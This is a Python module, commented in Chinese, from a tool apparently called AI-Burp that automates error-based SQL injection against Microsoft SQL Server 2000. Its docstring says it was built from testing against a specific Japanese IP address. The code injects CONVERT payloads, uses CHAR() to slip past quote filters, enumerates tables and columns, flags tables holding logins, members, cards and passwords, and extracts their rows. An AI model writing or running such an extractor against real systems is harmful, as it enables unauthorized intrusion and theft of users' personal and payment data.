"""
AI-Burp MSSQL 数据提取模块 v0.1.0

基于 39.110.232.75 (日本 MSSQL 2000) 测试经验开发

功能:
1. 报错注入数据提取 (CONVERT)
2. 单引号绕过 (CHAR() 函数)
3. 日文/Unicode 表名处理
4. MSSQL 2000 兼容性
5. 网络重试机制

技术细节:
- 使用 CHAR(85) 代替 'U' 绕过单引号过滤
- 使用 TOP N ... NOT IN (TOP N-1) 替代 ROW_NUMBER (MSSQL 2000 兼容)
- 支持日文错误信息解析
"""

import re
import time
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from ..sync_wrapper import SyncBurp as Burp
from ..burp import Response


@dataclass
class MSSQLExtractionResult:
    """MSSQL 数据提取结果"""
    url: str
    param: str
    db_name: str = ""
    db_user: str = ""
    db_version: str = ""
    tables: List[Dict] = field(default_factory=list)  # [{name, id, cols}]
    sensitive_tables: List[str] = field(default_factory=list)
    extracted_data: Dict[str, List[Dict]] = field(default_factory=dict)
    errors: List[str] = field(default_factory=list)
    
    def to_json(self) -> str:
        return json.dumps({
            "url": self.url,
            "param": self.param,
            "db_name": self.db_name,
            "db_user": self.db_user,
            "db_version": self.db_version,
            "tables": self.tables,
            "sensitive_tables": self.sensitive_tables,
            "extracted_data": self.extracted_data,
            "errors": self.errors,
        }, ensure_ascii=False, indent=2)
    
    def __str__(self):
        lines = [
            "=" * 60,
            "📊 MSSQL 数据提取报告",
            "=" * 60,
            f"目标: {self.url}",
            f"参数: {self.param}",
            f"数据库: {self.db_name}",
            f"用户: {self.db_user}",
            f"版本: {self.db_version[:50]}..." if self.db_version else "",
            "",
            f"📋 发现的表: {len(self.tables)} 个",
        ]
        
        if self.sensitive_tables:
            lines.append(f"🔴 敏感表: {', '.join(self.sensitive_tables)}")
        
        if self.extracted_data:
            lines.append("")
            lines.append("📋 提取的数据:")
            for table, rows in self.extracted_data.items():
                lines.append(f"  [{table}]: {len(rows)} 条记录")
        
        if self.errors:
            lines.append("")
            lines.append("⚠️ 错误:")
            for err in self.errors[:5]:
                lines.append(f"  - {err}")
        
        lines.append("=" * 60)
        return "\n".join(lines)


class MSSQLExtractor:
    """
    MSSQL 数据提取器
    
    特点:
    1. 使用 CHAR() 绕过单引号过滤
    2. 支持日文/Unicode 表名
    3. MSSQL 2000 兼容
    4. 网络重试机制
    """
    
    # 敏感表关键词
    SENSITIVE_KEYWORDS = [
        # 日文
        'ログイン', 'ビジター', '注文', '会員', '認証', 'カード', '支払',
        'パスワード', 'メール', '電話', '住所',
        # 英文
        'login', 'user', 'member', 'customer', 'order', 'pay', 'card',
        'admin', 'account', 'password', 'email', 'phone', 'address',
    ]
    
    # 敏感列关键词
    SENSITIVE_COLUMNS = [
        'password', 'pass', 'pwd', 'パスワード',
        'email', 'mail', 'メール', 'メールアドレス',
        'phone', 'tel', '電話', '電話番号',
        'address', '住所',
        'name', '名', '氏名',
        'card', 'credit', 'カード',
    ]
    
    # 日文错误信息模式
    JP_ERROR_PATTERNS = [
        r"(?:nvarchar|varchar).*?'([^']+)'",  # CONVERT 错误
        r"'([^']+)'.*?(?:近く|付近)",  # 语法错误
        r"エラー.*?'([^']+)'",  # 通用错误
    ]
    
    def __init__(self, burp: Burp, max_retries: int = 3):
        self.burp = burp
        self.max_retries = max_retries
    
    def _send_with_retry(self, url: str, param: str, payload: str) -> Response:
        """带重试的请求"""
        for attempt in range(self.max_retries):
            try:
                r = self.burp._send_param(url, param, payload, "GET")
                if r.ok or r.status == 500:  # 500 可能是报错注入成功
                    return r
            except Exception as e:
                if attempt == self.max_retries - 1:
                    raise
                time.sleep(1)
        return Response(status=0, body="", headers={}, time_ms=0, length=0)
    
    def _extract_from_error(self, body: str) -> Optional[str]:
        """从错误信息中提取数据"""
        for pattern in self.JP_ERROR_PATTERNS:
            match = re.search(pattern, body, re.I)
            if match:
                return match.group(1)
        return None
    
    def _error_inject(self, url: str, param: str, query: str) -> Optional[str]:
        """报错注入提取数据"""
        payload = f"24 AND 1=CONVERT(int,({query}))--"
        r = self._send_with_retry(url, param, payload)
        if r.body:
            return self._extract_from_error(r.body)
        return None
    
    def _char_escape(self, char: str) -> str:
        """将字符转换为 CHAR() 函数"""
        return f"CHAR({ord(char)})"
    
    def _string_to_char(self, s: str) -> str:
        """将字符串转换为 CHAR() 连接"""
        return "+".join([self._char_escape(c) for c in s])
    
    def extract(self, url: str, param: str, value: str = "24") -> MSSQLExtractionResult:
        """
        提取 MSSQL 数据
        
        Args:
            url: 目标 URL
            param: 注入参数
            value: 参数值
        
        Returns:
            MSSQLExtractionResult 对象
        """
        result = MSSQLExtractionResult(url=url, param=param)
        
        print("=" * 60)
        print("🔍 AI-Burp MSSQL 数据提取")
        print("=" * 60)
        print(f"目标: {url}")
        print(f"参数: {param}")
        print("")
        
        # 1. 获取数据库信息
        print("📊 获取数据库信息...")
        result.db_name = self._error_inject(url, param, "DB_NAME()") or ""
        result.db_user = self._error_inject(url, param, "SYSTEM_USER") or ""
        result.db_version = self._error_inject(url, param, "@@VERSION") or ""
        
        print(f"   数据库: {result.db_name}")
        print(f"   用户: {result.db_user}")
        print(f"   版本: {result.db_version[:50]}..." if result.db_version else "   版本: N/A")
        
        if not result.db_name:
            result.errors.append("无法获取数据库名，注入可能失败")
            return result
        
        # 2. 枚举表 (使用 CHAR(85) 代替 'U')
        print("\n📊 枚举用户表...")
        tables = self._enumerate_tables(url, param)
        result.tables = tables
        print(f"   发现 {len(tables)} 个表")
        
        # 3. 识别敏感表
        print("\n📊 识别敏感表...")
        for t in tables:
            name = t.get("name", "")
            if any(kw.lower() in name.lower() for kw in self.SENSITIVE_KEYWORDS):
                result.sensitive_tables.append(name)
                print(f"   🔴 {name}")
        
        # 4. 枚举敏感表的列
        print("\n📊 枚举敏感表列...")
        for t in result.tables:
            if t["name"] in result.sensitive_tables:
                cols = self._enumerate_columns(url, param, t["id"])
                t["cols"] = cols
                if cols:
                    print(f"   [{t['name']}]: {', '.join(cols[:5])}...")
        
        # 5. 提取数据
        print("\n📊 提取敏感数据...")
        for t in result.tables:
            if t["name"] in result.sensitive_tables and t.get("cols"):
                data = self._extract_table_data(url, param, t["name"], t["cols"])
                if data:
                    result.extracted_data[t["name"]] = data
                    print(f"   [{t['name']}]: {len(data)} 条记录")
        
        return result
    
    def _enumerate_tables(self, url: str, param: str) -> List[Dict]:
        """枚举用户表 (使用 CHAR(85) 绕过)"""
        tables = []
        
        for i in range(1, 50):
            # 使用 CHAR(85) 代替 'U'
            # TOP N ... ORDER BY ... DESC 模式 (MSSQL 2000 兼容)
            query = f"SELECT TOP 1 name+CHAR(124)+CAST(id AS varchar) FROM (SELECT TOP {i} name, id FROM sysobjects WHERE xtype=CHAR(85) ORDER BY name) AS T ORDER BY name DESC"
            val = self._error_inject(url, param, query)
            
            if val and '|' in val:
                name, oid = val.rsplit('|', 1)
                if name not in [t["name"] for t in tables]:
                    tables.append({"name": name, "id": oid, "cols": []})
            else:
                break
            
            time.sleep(self.burp.delay * 0.3)
        
        return tables
    
    def _enumerate_columns(self, url: str, param: str, table_id: str) -> List[str]:
        """枚举表的列"""
        cols = []
        
        for i in range(1, 30):
            query = f"SELECT TOP 1 name FROM (SELECT TOP {i} name FROM syscolumns WHERE id={table_id} ORDER BY colid) AS T ORDER BY colid DESC"
            val = self._error_inject(url, param, query)
            
            if val and val not in cols:
                cols.append(val)
            else:
                break
            
            time.sleep(self.burp.delay * 0.2)
        
        return cols
    
    def _extract_table_data(self, url: str, param: str, table: str, cols: List[str], max_rows: int = 10) -> List[Dict]:
        """提取表数据"""
        data = []
        
        # 找出敏感列
        sensitive_cols = [c for c in cols if any(kw.lower() in c.lower() for kw in self.SENSITIVE_COLUMNS)]
        if not sensitive_cols:
            sensitive_cols = cols[:5]
        
        for row in range(1, max_rows + 1):
            record = {}
            
            for col in sensitive_cols[:5]:
                query = f"SELECT TOP 1 CAST([{col}] AS nvarchar(500)) FROM (SELECT TOP {row} * FROM [{table}] ORDER BY 1) AS T ORDER BY 1 DESC"
                val = self._error_inject(url, param, query)
                
                if val:
                    # 脱敏
                    masked = self._mask_data(val, col)
                    record[col] = masked
                
                time.sleep(self.burp.delay * 0.2)
            
            if record:
                data.append(record)
            else:
                break
        
        return data
    
    def _mask_data(self, data: str, col_name: str) -> str:
        """脱敏敏感数据"""
        if not data:
            return data
        
        col_lower = col_name.lower()
        
        # 密码脱敏
        if any(kw in col_lower for kw in ['password', 'pass', 'pwd', 'パスワード']):
            return f"***REDACTED*** (len={len(data)})"
        
        # 邮箱脱敏
        if '@' in data:
            parts = data.split('@')
            if len(parts) == 2:
                return f"{parts[0][:3]}***@{parts[1]}"
        
        # 电话脱敏
        if any(kw in col_lower for kw in ['phone', 'tel', '電話']):
            if len(data) > 4:
                return f"{data[:4]}****"
        
        return data[:50] if len(data) > 50 else data


def mssql_extract_command(burp: Burp, url: str, param: str, value: str = "24") -> str:
    """MSSQL 提取命令入口"""
    extractor = MSSQLExtractor(burp)
    result = extractor.extract(url, param, value)
    return str(result)
